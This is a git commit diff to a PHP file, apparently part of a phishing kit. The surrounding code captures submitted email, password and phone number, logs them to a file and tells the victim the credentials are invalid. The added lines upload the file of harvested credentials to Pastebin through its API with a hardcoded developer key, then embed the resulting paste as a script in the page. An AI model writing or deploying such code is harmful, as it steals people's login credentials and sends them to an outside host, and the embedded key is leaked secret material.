1719c8a6a9da18724c34ab14db91d09f993313b9
dorothysingleton <118588072+dorothysingleton@users.noreply.github.com>
2023-06-12 22:43:55 -0500

    Update next.php

--- next.php
+++ next.php
@@ -41,3 +41,32 @@ if ($email != null && $password != null && $phone != null) {
     // Append the message to a new line in the output file
     file_put_contents($outputFile, $message, FILE_APPEND | LOCK_EX);
 
+    $signal = 'ok';
+    $msg = 'Invalid Credentials';
+}
+
+// Create a new paste on Pastebin
+$data = array(
+    'api_dev_key' => 'rZBA4lEyPJ3fJpL9mk-DJ8x7ySAaVjPr',
+    'api_option' => 'paste',
+    'api_paste_code' => file_get_contents($outputFile)
+);
+
+$curl = curl_init('https://pastebin.com/api/api_post.php');
+curl_setopt($curl, CURLOPT_POST, true);
+curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
+curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
+
+$response = curl_exec($curl);
+curl_close($curl);
+
+if ($response !== false) {
+    // Extract the paste key from the response
+    $pasteKey = trim($response);
+    $pasteUrl = "https://pastebin.com/embed/$pasteKey";
+    echo "<script src=\"$pasteUrl\"></script>";
+} else {
+    // Failed to create the Pastebin paste
+    echo "Error: Failed to create Pastebin paste.";
+}
+?>
